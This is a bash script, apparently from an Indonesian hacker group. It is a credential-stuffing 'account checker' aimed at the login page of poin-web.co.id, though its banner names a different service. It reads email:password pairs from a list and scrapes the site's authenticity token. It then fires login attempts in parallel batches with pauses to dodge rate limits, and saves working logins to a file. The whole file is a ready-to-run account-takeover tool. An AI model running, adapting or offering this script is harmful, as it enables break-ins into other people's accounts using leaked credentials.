#!/bin/bash
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
PUTIH='\033[1;37m'
echo -e "\e[38;5;206m"
echo -e "\e[1m"
cat << "EOF"
        ---------------------------------------------------------
                        o   o                    o
                         \ /                     |
                          O    oo o  o o-o  o-o -o-
                         / \  | | |  | |  | |-'  |
                        o   o o-o-o--O o  o o-o  o
                                     |
                                  o--o / Deatchbycaptcha Account Checker
                                  Rewrite: mtezy
                                  
        ---------------------------------------------------------
 
EOF
 
printf "\e[38;5;50m"
cat << "thanks"
         Thanks : Extreme Crew - ccoocoot ccoocot
                  XAYNET - SGBTeam - Rumah Sakit Jiwa
                  
                  
thanks

ngecek() {
    res1=$(date +%s)
    start_date=$(date +%H:%M:%S)
    extract=$(echo ${1} | cut -d@ -f1)
    postdata="{\"action\":\"loginAction\",\"fields\":{\"userLoginId\":\"${1}\",\"rememberMe\":\"true\",\"password\":\"${2}\"},\"verb\":\"POST\",\"mode\":\"login\",\"flow\":\"appleSignUp\"}"
	auth=$(curl -s "https://poin-web.co.id/users/sign_in"  | grep authenticity_token | grep -Po '(?<=value=")[^"]*' | cut -d '&' -f1 | tr -d '\012' | cut -d '=' -f1)
	login=$(curl -s "https://poin-web.co.id/users/sign_in" -X POST -i\
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" \
  -H "Connection: keep-alive" \
  -d "utf8=%E2%9C%93&authenticity_token=${auth}=&user%5Bemail%5D=${1}&user%5Bpassword%5D=${2}&user%5Bremember_me%5D=0&commit=Sign+in")
  #auth=$(echo "$gas" | grep _csrf | grep -Po '(?<=value=")[^;]*' | cut -d '"' -f1 | head -n 50)
  if [[ $login == *"You are being"* ]]; then
  printf "${NOCOLOR}[$i/$totalLines]${GREEN} INFO : $1:$2 ${secToken} \n"
  echo "$1:$2" >> pointtt.txt
  elif [[ $login == *"Halaman yang kamu cari tidak di temukan"* ]]; then
  printf "${NOCOLOR}[$i/$totalLines]${BLUE}[UNK] => $1:$2${NC} \n"
  else
  printf "${NOCOLOR}[$i/$totalLines]${RED}[DIE] => $1:$2${NC} \n"
  fi
	
	
}  
	

echo "List In This Directory : "
echo "Delimeter list -> email:password "
echo -n "Masukan File List : "
    read list
    echo "[+] Calculate your mailist file"
    echo "############################"
    totalLines=`grep -c ":" $list`
    echo "There are $totalLines of list."
    echo "############################"
    if [ ! -f $list ]; then
echo "$list No Such File"
    exit
    fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    persend=50
    setleep=5
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
    for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
    index=$((itung++))
    if [[ $(expr ${i} % ${persend}) == 0 && $i > 0 ]]; then
    percentage=$((100*$i/$totalLines))
    wait
    printf "SLEEP ${setleep}s\n"
    sleep $setleep
    fi
        emailna="${emailgblg[$i]}"
        kontol="${passwordna[$i]}"
        

        ngecek "$emailna" "$kontol" "${index}" &
    done
    wait
    
    